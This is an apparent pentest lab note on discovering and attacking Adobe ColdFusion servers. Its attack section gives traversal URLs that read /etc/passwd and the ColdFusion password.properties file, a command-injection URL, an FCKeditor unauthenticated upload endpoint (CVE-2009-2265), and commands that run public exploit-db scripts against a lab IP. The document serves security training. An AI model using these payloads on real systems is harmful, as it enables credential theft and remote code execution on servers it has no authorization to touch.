# Discovery & Enumeration
ColdFusion exposes a fair few ports by default:
- 80 HTTP
- 443 HTTPS
- 1935 RPC
- 25 SMTP
- 8500 SSL
- 5500 Server Monitor
It's important to note that default ports can be changed during installation or configuration.

## Enumeration
### Port Scanning
ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. So, scanning for these ports may indicate the presence of a ColdFusion server. Nmap might be able to identify ColdFusion during a services scan specifically.
The /CFIDE/administrator path, however, loads the ColdFusion 8 Administrator login page. Now we know for certain that ColdFusion 8 is running on the server
### File Extensions
ColdFusion pages typically use ".cfm" or ".cfc" file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.
### HTTP Headers
Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being used.
### Error Messages
If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.
### Default Files
ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm". Finding these files on the web server may indicate that the web application runs on ColdFusion.
# Attacking ColdFusion
## ColdFusion 8
```
searchsploit adobe coldfusion
```
### Adobe ColdFusion - Directory Traversal
```
http://example.com/index.cfm?directory=../../../etc/&file=passwd
```
#### Adobe ColdFusion 9.0.1 and earlier versions.
- CFIDE/administrator/settings/mappings.cfm
- logging/settings.cfm
- datasources/index.cfm
- j2eepackaging/editarchive.cfm
- CFIDE/administrator/enter.cfm
CVE-2010-2861 is the Adobe ColdFusion - Directory Traversal exploit discovered by searchsploit. It is a vulnerability in ColdFusion that allows attackers to conduct path traversal attacks.
Remote attackers can exploit this vulnerability to read arbitrary files by manipulating the locale parameter in these specific ColdFusion files
```
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```
#### searchsploit
```
searchsploit -p 14641
```
```
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
```
```
python2 14641.py
```
```
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```
### Adobe ColdFusion 8 - Remote Command Execution (RCE)
Unauthenticated RCE attack occurs when an attacker can execute arbitrary code on the server without requiring any authentication. This can happen when a web application allows the execution of arbitrary code through a feature or function that does not require authentication, such as a debugging console or a file upload functionality.
```
http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
```
#### Adobe ColdFusion versions 8.0.1 and earlier
##### CVE-2009-2265 FCKeditor
Exploit allowed unauthenticated users to upload files and gain remote code execution on the target host
```
http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

##### Searchsploit
```
searchsploit -p 50057
```
```
python3 50057.py
```